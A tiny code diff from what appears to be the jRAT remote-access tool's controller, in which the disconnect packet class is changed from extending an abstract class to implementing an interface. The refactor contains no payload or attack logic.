@@ -4,7 +4,7 @@ import jrat.controller.Slave;
 import jrat.controller.exceptions.CloseException;
 
 
-public class Packet11Disconnect extends AbstractOutgoingPacket {
+public class Packet11Disconnect implements OutgoingPacket {
 
 	@Override
 	public void write(Slave slave) throws Exception {
